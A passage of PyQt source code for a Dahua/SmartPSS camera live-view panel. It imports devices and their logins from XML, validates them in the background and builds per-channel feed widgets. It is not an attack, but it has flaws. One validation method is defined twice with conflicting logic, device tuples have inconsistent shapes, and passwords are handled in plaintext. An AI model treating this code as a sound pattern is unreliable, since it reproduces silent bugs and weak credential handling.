        summary_layout.setContentsMargins(0, 0, 0, 0)
        summary_layout.setSpacing(6)
        self.pss_device_count_label = QLabel("Devices\n0")
        self.pss_device_count_label.setObjectName("pss_metric")
        self.pss_channel_count_label = QLabel("Channels\n0")
        self.pss_channel_count_label.setObjectName("pss_metric")
        summary_layout.addWidget(self.pss_device_count_label)
        summary_layout.addWidget(self.pss_channel_count_label)
        left_layout.addWidget(summary_row)

        left_label = QLabel("DEVICES")
        left_label.setObjectName("pss_section_label")
        left_layout.addWidget(left_label)

        self.pss_devices_list = QListWidget()
        self.pss_devices_list.setObjectName("pss_devices")
        self.pss_devices_list.currentItemChanged.connect(
            lambda current, previous: self.populate_pss_feeds(current.data(32)) if current else None
        )
        left_layout.addWidget(self.pss_devices_list, 1)

        btn_row = QWidget()
        brl = QHBoxLayout(btn_row)
        brl.setContentsMargins(0, 0, 0, 0)
        brl.setSpacing(6)
        add_btn = QPushButton("Add")
        add_btn.setToolTip("Add device (IP + camera count)")
        add_btn.clicked.connect(self.on_add_pss_device)
        add_sel_btn = QPushButton("Selected")
        add_sel_btn.setToolTip("Add currently selected result to PSS devices")
        add_sel_btn.clicked.connect(self.add_selected_result_to_pss)
        import_btn = QPushButton("Import")
        import_btn.setToolTip("Import SmartPSS XML and add devices")
        import_btn.clicked.connect(self.import_smartpss_xml_dialog)
        brl.addWidget(add_btn)
        brl.addWidget(add_sel_btn)
        brl.addWidget(import_btn)
        left_layout.addWidget(btn_row)

        settings = QGroupBox("PSS Settings & Controls")
        sg = QFormLayout(settings)
        
        # Live Mode
        self.pss_live_checkbox = QCheckBox("Live Mode")
        self.pss_live_checkbox.setChecked(True)
        self.pss_live_checkbox.toggled.connect(self.toggle_live_mode)
        sg.addRow(self.pss_live_checkbox)
        
        # PTZ Control
        self.pss_ptz_checkbox = QCheckBox("Enable PTZ")
        self.pss_ptz_checkbox.setChecked(False)
        self.pss_ptz_checkbox.toggled.connect(self.toggle_ptz_mode)
        sg.addRow(self.pss_ptz_checkbox)
        
        # Quality selector
        self.pss_quality_combo = QComboBox()
        self.pss_quality_combo.addItems(["Auto", "Low", "Medium", "High"])
        self.pss_quality_combo.setEnabled(False)
        sg.addRow(QLabel("Quality:"), self.pss_quality_combo)
        
        # Mic/Sound are per-channel now - see the buttons on each feed
        # widget's control bar in _make_feed_widget, next to the REC button.

        left_layout.addWidget(settings)
        self.pss_ptz_checkbox.setEnabled(False)

        splitter.addWidget(left)

        # Main feed area
        main = QFrame()
        main.setObjectName("pss_main")
        main_layout = QVBoxLayout(main)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)
        # header bar with expand/focus button
        header_bar = QFrame()
        header_bar.setObjectName("pss_header")
        hb_layout = QHBoxLayout(header_bar)
        hb_layout.setContentsMargins(10, 8, 10, 8)
        hb_layout.setSpacing(8)
        header_text = QWidget()
        header_text_layout = QVBoxLayout(header_text)
        header_text_layout.setContentsMargins(0, 0, 0, 0)
        header_text_layout.setSpacing(1)
        header = QLabel("Live View")
        header.setObjectName("pss_title")
        self.pss_active_device_label = QLabel("No device selected")
        self.pss_active_device_label.setObjectName("pss_subtitle")
        header_text_layout.addWidget(header)
        header_text_layout.addWidget(self.pss_active_device_label)
        hb_layout.addWidget(header_text)
        # PSS-only URL bar (independent from main browser URL bar, hidden by default)
        self.pss_url_bar = QLineEdit()
        self.pss_url_bar.setPlaceholderText("RTSP template - edit and press Enter to load...")
        self.pss_url_bar.setFixedWidth(420)
        self.pss_url_bar.setVisible(False)
        # No sync with main url_bar - keep them independent to avoid conflicts
        self.pss_url_bar.returnPressed.connect(lambda: self.load_url_from_pss())
        hb_layout.addWidget(self.pss_url_bar)
        self.pss_channel_prev_btn = QPushButton()
        self.pss_channel_prev_btn.setIcon(self._arrow_icon("left"))
        self.pss_channel_prev_btn.setIconSize(QSize(12, 12))
        self.pss_channel_prev_btn.setToolTip("Previous channel")
        self.pss_channel_prev_btn.setFixedWidth(28)
        self.pss_channel_prev_btn.clicked.connect(self.select_pss_previous_channel)
        hb_layout.addWidget(self.pss_channel_prev_btn)
        self.pss_channel_label = QLabel("No channels")
        self.pss_channel_label.setObjectName("pss_subtitle")
        self.pss_channel_label.setMinimumWidth(90)
        self.pss_channel_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        hb_layout.addWidget(self.pss_channel_label)
        self.pss_channel_next_btn = QPushButton()
        self.pss_channel_next_btn.setIcon(self._arrow_icon("right"))
        self.pss_channel_next_btn.setIconSize(QSize(12, 12))
        self.pss_channel_next_btn.setToolTip("Next channel")
        self.pss_channel_next_btn.setFixedWidth(28)
        self.pss_channel_next_btn.clicked.connect(self.select_pss_next_channel)
        hb_layout.addWidget(self.pss_channel_next_btn)
        hb_layout.addStretch()
        expand_btn = QPushButton("Focus")
        expand_btn.setToolTip("Focus PSS (expand browser area)")
        expand_btn.setCheckable(True)
        expand_btn.setFixedHeight(28)
        expand_btn.clicked.connect(lambda checked: self.toggle_pss_focus(checked))
        hb_layout.addWidget(expand_btn)
        main_layout.addWidget(header_bar)

        self.pss_feed_scroll = QScrollArea()
        self.pss_feed_scroll.setObjectName("pss_feed_scroll")
        self.pss_feed_scroll.setWidgetResizable(True)
        self.pss_feed_container = QWidget()
        self.pss_feed_container.setObjectName("pss_feed_container")
        self.pss_feed_grid = QGridLayout(self.pss_feed_container)
        self.pss_feed_grid.setContentsMargins(10, 10, 10, 10)
        self.pss_feed_grid.setSpacing(10)
        self.pss_feed_scroll.setWidget(self.pss_feed_container)
        main_layout.addWidget(self.pss_feed_scroll, 1)

        splitter.addWidget(main)
        splitter.setSizes([300, 900])
        outer_layout.addWidget(splitter)
        w.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)

        # wire selection and context menu
        self.pss_devices_list.itemDoubleClicked.connect(lambda it: self.populate_pss_feeds(it.data(32)))
        self.pss_devices_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.pss_devices_list.customContextMenuRequested.connect(self.show_pss_device_menu)
        self.populate_pss_feeds(None)
        self.update_pss_summary()

        return w

    def toggle_pss_focus(self, enabled: bool):
        """Expand the main browser area to focus on PSS (hides left filter column) while keeping toolbar/statusbar."""
        try:
            # Save previous splitter sizes for restoration
            if enabled:
                try:
                    self._prev_splitter_sizes = list(self.splitter.sizes())
                except Exception:
                    self._prev_splitter_sizes = None
                total = sum(self._prev_splitter_sizes) if self._prev_splitter_sizes else max(1000, self.width())
                # set left panel to minimal and give remainder to browser area
                self.splitter.setSizes([1, max(1, total-1)])
                self.log("PSS focus: expanded.", "info")
            else:
                if getattr(self, '_prev_splitter_sizes', None):
                    try:
                        self.splitter.setSizes(self._prev_splitter_sizes)
                    except Exception:
                        pass
                self.log("PSS focus: restored.", "info")
            QTimer.singleShot(60, self.resize_browser_container)
        except Exception as e:
            self.log(f"toggle_pss_focus error: {e}", "error")

    def toggle_pss_mode(self, enabled: bool):
        """Show or hide the embedded PSS widget and restore browser views."""
        try:
            # Prefer switching the stacked widget when available
            if getattr(self, 'browser_stack', None):
                if enabled:
                    # pss_widget assumed index 2
                    if getattr(self, 'pss_widget', None):
                        # ensure underlying browsers are hidden to avoid native overlay issues
                        try:
                            if getattr(self, 'web_view', None):
                                self.web_view.hide()
                        except Exception:
                            pass
                        try:
                            if getattr(self, 'ie_frame', None):
                                self.ie_frame.hide()
                        except Exception:
                            pass
                        self.browser_stack.setCurrentWidget(self.pss_widget)
                        # show mirrored URL bar inside PSS header
                        try:
                            if getattr(self, 'pss_url_bar', None):
                                self.pss_url_bar.setVisible(True)
                            self._set_pss_channel_controls_visible(True)
                        except Exception:
                            pass
                        # ensure the PSS widget and its sidebar are visible
                        try:
                            self.pss_widget.show()
                            if getattr(self, 'pss_devices_list', None):
                                self.pss_devices_list.show()
                            # if no devices, add a demo device so UI is obvious
                            if getattr(self, 'pss_devices_list', None) and self.pss_devices_list.count() == 0 and not getattr(self, '_pss_demo_added', False):
                                demo_ip = "192.168.1.100"
                                demo_count = 4
                                it = QListWidgetItem(f"{demo_ip} ({demo_count})")
                                it.setData(32, (demo_ip, demo_count))
                                self.pss_devices_list.addItem(it)
                                self.pss_devices_list.setCurrentItem(it)
                                self.update_pss_summary()
                                self._pss_demo_added = True
                                # auto-populate feeds for the demo
                                self.populate_pss_feeds((demo_ip, demo_count))
                        except Exception:
                            pass
                        self.log("Entered PSS Mode.", "info")
                    else:
                        self.log("PSS widget not available.", "warning")
                else:
                    # restore web view or IE wrapper
                    if getattr(self, 'use_ie', False):
                        self.browser_stack.setCurrentIndex(0)
                        try:
                            if getattr(self, 'ie_frame', None):
                                self.ie_frame.show()
                        except Exception:
                            pass
                    else:
                        self.browser_stack.setCurrentIndex(1)
                        try:
                            if getattr(self, 'web_view', None):
                                self.web_view.show()
                        except Exception:
                            pass
                    # hide mirrored PSS URL bar and keep PSS widget hidden
                    try:
                        if getattr(self, 'pss_url_bar', None):
                            self.pss_url_bar.setVisible(False)
                        self._set_pss_channel_controls_visible(False)
                        if getattr(self, 'pss_widget', None):
                            self.pss_widget.hide()
                    except Exception:
                        pass
                    self.log("Exited PSS Mode.", "info")
            else:
                # fallback to show/hide behavior
                if enabled:
                    if getattr(self, 'pss_widget', None):
                        self.pss_widget.show()
                    self._set_pss_channel_controls_visible(True)
                    if getattr(self, 'web_view', None):
                        try: self.web_view.hide()
                        except: pass
                    if getattr(self, 'ie_frame', None):
                        try: self.ie_frame.hide()
                        except: pass
                else:
                    if getattr(self, 'pss_widget', None):
                        self.pss_widget.hide()
                    if getattr(self, 'use_ie', False):
                        if getattr(self, 'ie_frame', None):
                            try: self.ie_frame.show()
                            except: pass
                    else:
                        if getattr(self, 'web_view', None):
                            try: self.web_view.show()
                            except: pass
            QTimer.singleShot(50, self.resize_browser_container)
        except Exception as e:
            self.log(f"toggle_pss_mode error: {e}", "error")

    def load_url_from_pss(self):
        """Load URL entered in the PSS URL bar into the main browser view.

        If the URL contains [PLACEHOLDERS], replace them with values from
        the currently-selected device.
        """
        try:
            if getattr(self, 'pss_url_bar', None):
                url = self.pss_url_bar.text().strip()
                if url:
                    # Replace placeholders if this is an RTSP template
                    if "[" in url and "]" in url:
                        try:
                            from modules.pss_manager import pss_manager, PSS_Session
                            # Get current device info from PSS sessions
                            device_key = None
                            if hasattr(self, '_pss_sessions'):
                                device_key = list(self._pss_sessions.keys())[0] if self._pss_sessions else None

                            if device_key:
                                session_data = self._pss_sessions[device_key]
                                # Get current channel from selected widget
                                channel = 0
                                if hasattr(self, '_pss_feed_widgets') and self._pss_feed_widgets:
                                    widgets = self._pss_feed_widgets
                                    selected_idx = getattr(self, '_pss_current_channel_index', 0)
                                    if 0 <= selected_idx < len(widgets):
                                        channel = widgets[selected_idx]._channel

                                session = PSS_Session(
                                    brand=session_data.get('brand', 'Generic'),
                                    ip=session_data.get('ip'),
                                    port=session_data.get('port'),
                                    username=session_data.get('username', ''),
                                    password=session_data.get('password', '')
                                )
                                url = pss_manager.fill_rtsp_template(session, url, channel)
                                self.log(f"Filled RTSP template with placeholders for channel {channel}", "info")
                        except Exception as e:
                            self.log(f"Placeholder replacement: {e}", "warning")

                    self.url_bar.setText(url)
                    self.load_url()
        except Exception as e:
            self.log(f"load_url_from_pss error: {e}", "error")

    def on_progress_value_changed(self, value: int):
        try:
            pct = int(value)
            self.progress_pct_label.setText(f"{pct}%")
            if pct < 33:
                color = "#ff4d4d"
            elif pct < 66:
                color = "#ffb84d"
            else:
                color = "#4CAF50"
            style = f"QProgressBar{{border:1px solid #222; border-radius:7px; background:#071422; height:14px;}} QProgressBar::chunk{{background:{color}; border-radius:7px;}}"
            self.progress.setStyleSheet(style)
            self.progress_pct_label.setStyleSheet(f"font-weight:bold; color:{color};")
        except Exception as e:
            self.log(f"progress style update error: {e}", "warning")

    def toggle_pss_fullscreen(self, enabled: bool):
        """Toggle an app-level PSS 'fullscreen' that hides the left filter and expands browser area.

        This keeps toolbars and statusbar visible (not true OS fullscreen).
        """
        try:
            if enabled:
                # save previous state
                try:
                    self._prev_splitter_sizes = list(self.splitter.sizes())
                except Exception:
                    self._prev_splitter_sizes = None
                try:
                    self._prev_filter_visible = self.filter_tabs.isVisible()
                except Exception:
                    self._prev_filter_visible = True
                # hide the left filter area and expand browser
                try:
                    self.filter_tabs.hide()
                except Exception:
                    pass
                try:
                    if getattr(self, 'controls_frame', None):
                        self.controls_frame.hide()
                except Exception:
                    pass
                total = sum(self._prev_splitter_sizes) if self._prev_splitter_sizes else max(1000, self.width())
                self.splitter.setSizes([0, max(1, total)])
                # Ensure PSS view is active
                if getattr(self, 'pss_mode_action', None) and self.pss_mode_action.isChecked():
                    try:
                        if getattr(self, 'pss_widget', None):
                            # hide native web/IE widgets to avoid overlay issues
                            try:
                                if getattr(self, 'web_view', None):
                                    self.web_view.hide()
                            except Exception:
                                pass
                            try:
                                if getattr(self, 'ie_frame', None):
                                    self.ie_frame.hide()
                            except Exception:
                                pass
                            self.browser_stack.setCurrentWidget(self.pss_widget)
                    except Exception:
                        pass
                # show mirrored URL inside PSS while fullscreen
                try:
                    if getattr(self, 'pss_url_bar', None):
                        self.pss_url_bar.setVisible(True)
                    self._set_pss_channel_controls_visible(True)
                except Exception:
                    pass
                self.log("PSS fullscreen: enabled", "info")
                # also use window fullscreen to cover entire screen while keeping our status/toolbars
                try:
                    self.showFullScreen()
                except Exception:
                    pass
            else:
                # restore filter visibility and sizes
                try:
                    if getattr(self, '_prev_filter_visible', True):
                        self.filter_tabs.show()
                except Exception:
                    pass
                try:
                    if getattr(self, 'controls_frame', None):
                        self.controls_frame.show()
                except Exception:
                    pass
                if getattr(self, '_prev_splitter_sizes', None):
                    try:
                        self.splitter.setSizes(self._prev_splitter_sizes)
                    except Exception:
                        pass
                try:
                        if getattr(self, 'pss_url_bar', None):
                            self.pss_url_bar.setVisible(self.pss_mode_action.isChecked() if getattr(self, 'pss_mode_action', None) else False)
                        self._set_pss_channel_controls_visible(self.pss_mode_action.isChecked() if getattr(self, 'pss_mode_action', None) else False)
                except Exception:
                    pass
                # show underlying web/IE when exiting fullscreen
                try:
                    if getattr(self, 'use_ie', False):
                        if getattr(self, 'ie_frame', None):
                            self.ie_frame.show()
                    else:
                        if getattr(self, 'web_view', None):
                            self.web_view.show()
                except Exception:
                    pass
                self.log("PSS fullscreen: disabled", "info")
                try:
                    self.showNormal()
                except Exception:
                    pass
            QTimer.singleShot(60, self.resize_browser_container)
        except Exception as e:
            self.log(f"toggle_pss_fullscreen error: {e}", "error")

    def show_pss_device_menu(self, pos):
        try:
            item = self.pss_devices_list.itemAt(pos)
            if not item: return
            menu = QMenu(self)
            act_remove = menu.addAction("Remove Device")
            act_edit = menu.addAction("Edit Device")
            chosen = menu.exec(self.pss_devices_list.mapToGlobal(pos))
            if chosen == act_remove:
                self.pss_devices_list.takeItem(self.pss_devices_list.row(item))
                self.update_pss_summary()
                current = self.pss_devices_list.currentItem()
                self.populate_pss_feeds(current.data(32) if current else None)
            elif chosen == act_edit:
                ip, count = item.data(32)
                new_ip, ok = QInputDialog.getText(self, "Edit Device", "Device IP:", text=ip)
                if not ok: return
                new_count, ok = QInputDialog.getInt(self, "Edit Cameras", "Camera count:", count, 1, 64)
                if not ok: return
                item.setText(f"{new_ip} ({new_count})")
                item.setData(32, (new_ip, new_count))
                self.update_pss_summary()
                self.populate_pss_feeds((new_ip, new_count))
        except Exception as e:
            self.log(f"PS S device menu error: {e}", "error")

    def update_pss_summary(self):
        try:
            if not getattr(self, 'pss_devices_list', None):
                return
            devices = self.pss_devices_list.count()
            channels = 0
            for row in range(devices):
                item = self.pss_devices_list.item(row)
                data = item.data(32) if item else None
                if isinstance(data, tuple) and len(data) >= 2:
                    try:
                        channel_value = data[4] if len(data) >= 5 else data[1]
                        channels += max(1, min(int(channel_value), 256))
                    except Exception:
                        channels += 1
            if getattr(self, 'pss_device_count_label', None):
                self.pss_device_count_label.setText(f"Devices\n{devices}")
            if getattr(self, 'pss_channel_count_label', None):
                self.pss_channel_count_label.setText(f"Channels\n{channels}")
        except Exception as e:
            self.log(f"PSS summary update error: {e}", "warning")

    def on_add_pss_device(self):
        try:
            ip, ok = QInputDialog.getText(self, "Add PSS Device", "Device IP or hostname:")
            if not ok or not ip.strip():
                return
            count, ok = QInputDialog.getInt(self, "Add Channels", "Camera/channel count:", 4, 1, 64)
            if not ok:
                return
            ip = ip.strip()
            item = QListWidgetItem(f"{ip} ({count})")
            item.setData(32, (ip, count))
            self.pss_devices_list.addItem(item)
            self.pss_devices_list.setCurrentItem(item)
            self.update_pss_summary()
            self.populate_pss_feeds((ip, count))
            self.log(f"Added PSS device {ip} with {count} channel(s)", "info")
        except Exception as e:
            self.log(f"Add PSS device error: {e}", "error")

    def add_selected_result_to_pss(self):
        table, key = self._get_active_table_and_key()
        if not table or table.rowCount() == 0:
            QMessageBox.information(self, "Add Device", "No result selected.")
            return
        row = table.currentRow()
        if row < 0:
            QMessageBox.information(self, "Add Device", "No result selected.")
            return
        text = table.item(row, 0).text() if table.item(row, 0) else ""
        import re
        m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", text)
        ip = m.group(1) if m else text
        brand = getattr(self, 'brand_combo', None)
        brand_name = brand.currentText() if brand else "Generic"
        port = int(self.port_spin.value()) if getattr(self, 'port_spin', None) else 80
        count = 1
        it = QListWidgetItem(f"{ip}:{port} ({brand_name}) ({count})")
        it.setData(32, (ip, port, brand_name, count))
        self.pss_devices_list.addItem(it)
        self.pss_devices_list.setCurrentItem(it)
        self.update_pss_summary()
        self.populate_pss_feeds((ip, port, brand_name, "", "", count))
        self.log(f"Added device {ip}:{port} ({brand_name}) to PSS", "info")

    def import_smartpss_xml_dialog(self):
        """Open a file dialog to import a SmartPSS XML and add devices to the PSS sidebar.
        
        Automatically detects and suggests the test XML from Results/save.xml
        """
        try:
            # Try to auto-detect test XML
            test_xml_path = Path(Path(__file__).resolve().parent / "Results" / "save.xml")
            if not test_xml_path.exists():
                test_xml_path = Path.cwd() / "Results" / "save.xml"
            
            default_dir = str(test_xml_path.parent) if test_xml_path.exists() else ""
            
            fname, _ = QFileDialog.getOpenFileName(
                self, 
                "Import SmartPSS XML", 
                default_dir,
                "SmartPSS XML Files (*.xml);;All Files (*)"
            )
            
            if not fname:
                # If no file selected, try the test XML
                if test_xml_path.exists():
                    fname = str(test_xml_path)
                else:
                    return
            
            # Load devices from XML with real device info via Dahua helper
            devices = load_devices_from_xml(fname)
            if not devices:
                QMessageBox.information(self, "Import XML", "No devices found in XML.")
                return
            
            self.log(f"Loading {len(devices)} devices from XML...", "info")
            added = 0
            imported_items = []
            for d in devices:
                ip = d.get('ip') or d.get('address') or d.get('ipAddress')
                if not ip:
                    continue

                port = int(d.get('port') or 37777)
                user = d.get('user') or d.get('login') or ''
                pwd = d.get('password') or d.get('pwd') or d.get('pass') or ''
                channels = max(1, min(int(d.get('channels') or d.get('cameraCount') or d.get('count') or 1), 256))

                it = QListWidgetItem(f"⚫ {ip}:{port} ({channels}ch) [pending]")
                # Store complete device data in item
                it.setData(32, (ip, port, user, pwd, channels))
                self.pss_devices_list.addItem(it)
                imported_items.append((it, ip, port, user, pwd, channels))
                added += 1

            self.update_pss_summary()
            self.log(f"Imported {added} devices from {fname}. Validation will continue in the background.", "info")
            QMessageBox.information(self, "Import XML", f"Imported {added} devices into PSS.")

            # Validate devices in the background to keep the UI responsive
            if imported_items:
                self._stop_background = False
                self._import_validation_thread = threading.Thread(
                    target=self._validate_imported_pss_devices,
                    args=(imported_items,),
                    daemon=True,
                )
                self._import_validation_thread.start()

            # Keep the first imported device selected but do not block the UI by auto-populating
            try:
                if added > 0:
                    self.pss_devices_list.setCurrentRow(self.pss_devices_list.count() - added)
            except Exception:
                pass
        except Exception as e:
            self.log(f"Import XML error: {e}", "error")
            QMessageBox.critical(self, "Import XML", f"Failed to import XML: {e}")

    def _validate_imported_pss_devices(self, imported_items):
        try:
            from modules.dahua_pss_helper import load_dahua_controller, get_device_channels
            for item, ip, port, user, pwd, channels in imported_items:
                if getattr(self, '_stop_background', False):
                    break
                try:
                    controller = load_dahua_controller(ip, port, user, pwd)
                    if controller and hasattr(controller, 'status') and controller.status.name == 'SUCCESS':
                        real_channels = get_device_channels(controller) or channels
                        model = getattr(controller, 'model', f'Device @ {ip}')
                        status_text = f"🔴 {ip}:{port} - {model} ({real_channels}ch)"
                        def update_item(item=item, text=status_text):
                            item.setText(text)
                        QTimer.singleShot(0, update_item)
                        msg = f"Validated {ip}:{port} - {model} ({real_channels}ch)"
                        def log_success(msg=msg):
                            self.log(msg, "success")
                        QTimer.singleShot(0, log_success)
                        continue
                    else:
                        # Connection made but auth failed
                        def log_auth_fail(ip=ip, port=port):
                            self.log(f"Device {ip}:{port} auth failed or offline", "warning")
                        QTimer.singleShot(0, log_auth_fail)
                except socket.timeout:
                    def log_timeout(ip=ip, port=port):
                        self.log(f"Device {ip}:{port} timeout", "warning")
                    QTimer.singleShot(0, log_timeout)
                except Exception as e:
                    def log_error(ip=ip, err=str(e)):
                        self.log(f"Validation failed for {ip}: {err}", "warning")
                    QTimer.singleShot(0, log_error)
                
                # Mark as offline if validation didn't succeed
                def mark_offline(item=item, ip=ip, port=port, channels=channels):
                    item.setText(f"⚫ {ip}:{port} ({channels}ch) [offline]")
                QTimer.singleShot(0, mark_offline)
        except Exception as e:
            def log_backend_error(err=str(e)):
                self.log(f"Backend validation error: {err}", "error")
            QTimer.singleShot(0, log_backend_error)

    def _validate_imported_pss_devices(self, imported_items):
        """Authenticate imported devices off the GUI thread."""
        from modules.dahua_pss_helper import load_dahua_controller, get_device_channels, get_device_capabilities
        for item, ip, port, user, pwd, fallback_channels in imported_items:
            if getattr(self, '_stop_background', False):
                break
            result = {
                'item': item, 'ip': ip, 'port': port,
                'channels': fallback_channels, 'connected': False,
            }
            try:
                controller = load_dahua_controller(ip, int(port), user, pwd)
                if controller:
                    result['connected'] = True
                    result['controller'] = controller
                    result['channels'] = max(1, min(get_device_channels(controller) or fallback_channels, 256))
                    result['capabilities'] = get_device_capabilities(controller)
            except socket.timeout:
                result['reason'] = 'timeout'
            except Exception as exc:
                result['reason'] = str(exc)
            self.pss_device_validated.emit(result)

    def _apply_pss_device_validation(self, result):
        """Apply background connection results on the GUI thread."""
        try:
            item = result['item']
            ip, port = result['ip'], result['port']
            channels = result['channels']
            if result.get('connected'):
                caps = result.get('capabilities') or {}
                model = caps.get('model', 'Dahua device')
                item.setText(f"ONLINE  {ip}:{port} - {model} ({channels}ch)")
                item.setForeground(QColor("#7ee787"))
                if not hasattr(self, '_pss_device_controllers'):
                    self._pss_device_controllers = {}
                self._pss_device_controllers[f"{ip}:{port}"] = result
                for control in (
                    getattr(self, 'pss_ptz_checkbox', None),
                    getattr(self, 'pss_quality_combo', None),
                ):
                    if control is not None:
                        control.setEnabled(True)
                self.log(f"Connected to {ip}:{port} ({channels} channels)", "success")
            else:
                item.setText(f"OFFLINE  {ip}:{port} ({channels}ch)")
                item.setForeground(QColor("#ff8f8f"))
                self.log(f"PSS device {ip}:{port}: {result.get('reason', 'offline or authentication failed')}", "warning")

            data = item.data(32)
            if isinstance(data, tuple) and len(data) >= 5:
                item.setData(32, (data[0], data[1], data[2], data[3], channels))
            self.update_pss_summary()
            if self.pss_devices_list.currentItem() is item:
                # Rebuild from the authenticated channel count. populate_pss_feeds
                # uses the cached controller, so this does not reconnect the device.
                self.populate_pss_feeds(item.data(32))
        except Exception as exc:
            self.log(f"PSS validation UI update failed: {exc}", "warning")

    def _parse_smartpss_xml(self, path):
        """Fallback XML parser for legacy XML structure.

        This is retained only as a fallback; device loading normally uses
        the Dahua helper module's load_devices_from_xml().
        """
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(path)
            root = tree.getroot()
            devices = []
            for dev in root.findall('.//Device'):
                ip = dev.get('ip') or dev.get('address') or dev.get('ipAddress')
                port = dev.get('port') or dev.get('Port') or 37777
                user = dev.get('user') or dev.get('userName') or dev.get('login') or 'admin'
                pwd = dev.get('password') or dev.get('pwd') or ''
                try:
                    count = int(dev.get('channels') or dev.get('cameraCount') or 1)
                except Exception:
                    count = 1
                if ip:
                    devices.append({'ip': ip, 'port': port, 'user': user, 'password': pwd, 'count': count})
            return devices
        except Exception as e:
            raise

    def _make_pss_placeholder_widget(self):
        """Create a minimal placeholder PSS widget when the full PSS widget cannot be created.

        This provides an Import XML button so users can still load devices.
        """
        w = QWidget()
        w.setStyleSheet("""
            QWidget { background: #24272c; color: #d8dee5; }
            QLabel { color: #d8dee5; }
            QPushButton {
                background: #2b3037;
                color: #e5e9ef;
                border: 1px solid #424851;
                border-radius: 4px;
                padding: 7px 10px;
            }
            QPushButton:hover { background: #363c44; }
        """)
        layout = QVBoxLayout(w)
        layout.setContentsMargins(12, 12, 12, 12)
        title = QLabel("PSS Mode (Placeholder)")
        title.setStyleSheet("font-weight:bold; font-size:14px; color:#f2f5f7;")
        layout.addWidget(title)
        info = QLabel("PSS UI failed to initialize. You can import a SmartPSS XML to populate devices.")
        info.setWordWrap(True)
        info.setStyleSheet("color:#aeb7c2; margin-top:8px;")
        layout.addWidget(info)
        btn = QPushButton("Import SmartPSS XML")
        btn.clicked.connect(self.import_smartpss_xml_dialog)
        layout.addWidget(btn)
        layout.addStretch()
        return w

    def _make_feed_widget(self, ip, port, user, pwd, idx, total_channels):
        """Create a professional camera feed widget with device info and controls.
        
        Features:
        - Title bar with channel number and status
        - Live status indicator
        - Device model/IP info
        - PTZ controls when enabled
        - Snapshot button for interaction
        """
        try:
            frame = QFrame()
            frame.setStyleSheet("""
                QFrame {
                    background: #0d0f13;
                    border: 2px solid #1a4d66;
                    border-radius: 6px;
                }
                QLabel {
                    border: none;
                    background: transparent;
                }
            """)
            frame.setMinimumHeight(200)
            v = QVBoxLayout(frame)
            v.setContentsMargins(0, 0, 0, 0)
            v.setSpacing(0)

            # Professional title bar
            title_bar = QFrame()
            title_bar.setStyleSheet("""
                QFrame {
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0, 
                        stop:0 #1a2636, stop:1 #263d52);
                    border: none;
                    border-bottom: 1px solid #446688;
                    border-radius: 6px 6px 0 0;
                }
            """)
            title_layout = QHBoxLayout(title_bar)
            title_layout.setContentsMargins(10, 7, 10, 7)
            title_layout.setSpacing(8)
            
            channel_label = QLabel(f"📹 CH {idx + 1:02d}/{total_channels:02d}")
            channel_label.setStyleSheet("color: #7ecfe8; font-weight: 700; font-size: 12px;")
            
            device_label = QLabel(f"{ip}:{port}")
            device_label.setStyleSheet("color: #a8c5db; font-size: 10px;")
            
            state_label = QLabel("● STANDBY")
            state_label.setStyleSheet("color: #9aa4af; font-size: 10px; font-weight: 600;")
            
            title_layout.addWidget(channel_label)
            title_layout.addWidget(device_label, 1)
            title_layout.addStretch()
            title_layout.addWidget(state_label)
            v.addWidget(title_bar)

            # Main feed display area
            lbl = QLabel(f"CAMERA {idx + 1}\n{ip}\nWaiting for live feed...\n\n[Click to fetch snapshot]")
            lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            lbl.setStyleSheet("""
                color: #7ecfe8;
                padding: 12px;
                background: linear-gradient(135deg, #07090c 0%, #0f1419 100%);
                font-size: 11px;
                font-weight: 500;
                border: none;
            """)
            lbl.setMinimumSize(240, 140)
            lbl.setCursor(Qt.CursorShape.PointingHandCursor)

            video_widget = QVideoWidget()
            video_widget.setMinimumSize(240, 140)
            video_widget.setStyleSheet("background-color: black; border: none;")

            feed_stack = QStackedWidget()
            feed_stack.addWidget(lbl)
            feed_stack.addWidget(video_widget)
            feed_stack.setCurrentWidget(lbl)

            # Store references for state toggling
            frame._state_label = state_label
            frame._feed_label = lbl
            frame._feed_stack = feed_stack
            frame._video_widget = video_widget
            frame._media_player = None
            frame._audio_output = None
            frame._streaming = False
            frame._talk_session = None
            frame._audio_source = None
            frame._audio_source_io = None
            frame._rtsp_port = 554 if int(port) == 37777 else int(port)
            frame._rtsp_fallback_port = int(port) if int(port) != 554 else None
            frame._rtsp_fallback_tried = False
            frame._base_text = f"CAMERA {idx + 1}\n{ip}\nWaiting for live feed..."
            frame._ip = ip
            frame._port = port
            frame._channel = idx
            frame._user = user
            frame._pwd = pwd

            # Click handler for snapshot
            def fetch_snapshot_handler(evt=None):
                self.fetch_pss_snapshot(ip, port, user, pwd, idx)

            lbl.mouseDoubleClickEvent = fetch_snapshot_handler

            v.addWidget(feed_stack, 1)

            # Advanced control bar
            ctrl_bar = QWidget()
            ctrl_layout = QHBoxLayout(ctrl_bar)
            ctrl_layout.setContentsMargins(6, 6, 6, 6)
            ctrl_layout.setSpacing(4)
            
            # Snapshot button with icon
            snap_btn = QPushButton("📸 Snapshot")
            snap_btn.setMaximumHeight(22)
            snap_btn.setStyleSheet("""
                QPushButton {
                    background: #2b4a66;
                    color: #7ecfe8;
                    border: 1px solid #446688;
                    border-radius: 3px;
                    padding: 2px 6px;
                    font-size: 9px;
                    font-weight: 600;
                }
                QPushButton:hover { background: #3a5a76; border-color: #5678a8; }
            """)
            snap_btn.clicked.connect(lambda: self.fetch_pss_snapshot(ip, port, user, pwd, idx))
            ctrl_layout.addWidget(snap_btn)

            fullscreen_btn = QPushButton("Fullscreen")
            fullscreen_btn.setMaximumHeight(22)
            fullscreen_btn.setToolTip("Open this channel in a fullscreen window")
            fullscreen_btn.clicked.connect(lambda: self.open_pss_channel_fullscreen(frame))
            ctrl_layout.addWidget(fullscreen_btn)
            
            # Recording indicator
            rec_btn = QPushButton("● REC")
            rec_btn.setMaximumHeight(22)
            rec_btn.setMaximumWidth(50)
            rec_btn.setStyleSheet("""
                QPushButton {
                    background: #3a2a2a;
